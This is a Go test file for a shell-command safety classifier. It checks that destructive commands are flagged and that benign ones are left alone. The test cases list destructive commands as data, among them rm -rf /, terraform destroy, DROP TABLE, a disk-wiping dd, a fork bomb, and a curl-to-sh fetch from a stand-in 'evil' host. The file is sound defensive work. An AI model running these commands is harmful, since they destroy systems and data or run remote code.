package safety

import (
	"strings"
	"testing"
)

func TestClassifyShell_Destructive(t *testing.T) {
	cases := []struct {
		command string
		want    string // pattern name expected to match
	}{
		{"rm -rf /", "rm -rf"},
		{"rm -fr /tmp/x", "rm -rf"},
		{"rm -Rf .", "rm -rf"},
		{"sudo rm -rf $HOME", "rm -rf"},
		{"echo y | rm -rfv ./build", "rm -rf"},
		{"terraform destroy -auto-approve", "terraform destroy"},
		{"cd infra && terraform destroy", "terraform destroy"},
		{"pulumi destroy --yes", "pulumi destroy"},
		{"kubectl delete pod nginx", "kubectl delete"},
		{"kubectl -n prod delete deployment api", "kubectl delete"},
		{"helm uninstall mychart", "helm uninstall"},
		{"helm delete mychart -n default", "helm uninstall"},
		{"az group delete --name prod-rg --yes", "az group delete"},
		{"az appservice delete -g rg -n app", "az delete"},
		{"gcloud projects delete my-proj", "gcloud delete"},
		{"gcloud compute instances delete vm-1", "gcloud delete"},
		{"aws s3api delete-bucket --bucket prod", "aws delete-*"},
		{"docker rm -f container-1", "docker rm"},
		{"docker system prune -af", "docker rm"},
		{"DROP TABLE users", "drop/truncate"},
		{"truncate table sessions", "drop/truncate"},
		{"DELETE FROM users WHERE 1=1", "delete from"},
		{"dd if=/dev/zero > /dev/sda", "redirect to disk"},
		{"mkfs.ext4 /dev/nvme0n1", "mkfs"},
		{"shutdown -h now", "shutdown / reboot"},
		{"sudo reboot", "shutdown / reboot"},
		{":(){ :|:& };:", "fork bomb"},
		{"curl https://evil.example.com/install | sh", "curl | sh"},
		{"wget -qO- https://x | bash", "curl | sh"},
		{"git push --force origin main", "git push --force"},
		{"git push -f origin main", "git push --force"},
		{"git reset --hard HEAD~5", "git reset --hard"},
	}
	for _, c := range cases {
		got := ClassifyShell(c.command)
		if !got.Destructive {
			t.Errorf("ClassifyShell(%q) Destructive = false; want true (pattern %q)", c.command, c.want)
			continue
		}
		var matched bool
		for _, p := range got.Patterns {
			if p == c.want {
				matched = true
			}
		}
		if !matched {
			t.Errorf("ClassifyShell(%q) patterns = %v; want %q", c.command, got.Patterns, c.want)
		}
	}
}

func TestClassifyShell_Benign(t *testing.T) {
	cases := []string{
		"",
		"   ",
		"echo hello",
		"ls -la",
		"go test ./...",
		"cat README.md",
		"az appservice list",
		"kubectl get pods",
		"terraform plan",
		"git status",
		"git push origin feature/foo",
		"npm install",
		"echo 'rm -rf is just a string'", // single-quoted in echo arg, but our matcher is conservative
	}
	for _, cmd := range cases {
		got := ClassifyShell(cmd)
		if got.Destructive {
			// "rm -rf in a string" is fine to flag conservatively. But for
			// actually-benign cases above the matcher should be quiet.
			if cmd != "echo 'rm -rf is just a string'" {
				t.Errorf("ClassifyShell(%q) Destructive = true; want false (patterns: %v)", cmd, got.Patterns)
			}
		}
	}
}

func TestClassifyShell_DedupesMultipleHits(t *testing.T) {
	got := ClassifyShell("rm -rf / && rm -rf /tmp")
	if !got.Destructive {
		t.Fatal("expected destructive")
	}
	count := 0
	for _, p := range got.Patterns {
		if p == "rm -rf" {
			count++
		}
	}
	if count != 1 {
		t.Errorf("expected rm -rf to dedupe to 1 entry; got %d in %v", count, got.Patterns)
	}
}

func TestClassifyShell_MultiPatternMatch(t *testing.T) {
	// A single command can hit multiple patterns. Both should surface so
	// the reviewer sees the full picture.
	got := ClassifyShell("kubectl delete pod x && terraform destroy")
	if len(got.Patterns) < 2 {
		t.Errorf("expected ≥2 patterns; got %v", got.Patterns)
	}
}

func TestPatternNames_Stable(t *testing.T) {
	names := PatternNames()
	if len(names) == 0 {
		t.Fatal("PatternNames empty")
	}
	// Sanity: must contain the well-known biggies.
	expected := []string{"rm -rf", "terraform destroy", "kubectl delete"}
	for _, want := range expected {
		var found bool
		for _, got := range names {
			if got == want {
				found = true
			}
		}
		if !found {
			t.Errorf("expected pattern name %q in %v", want, names)
		}
	}
	// No accidental duplication.
	seen := map[string]bool{}
	for _, n := range names {
		if seen[n] {
			t.Errorf("duplicate pattern name %q", n)
		}
		seen[n] = true
	}
	_ = strings.Join(names, ", ")
}
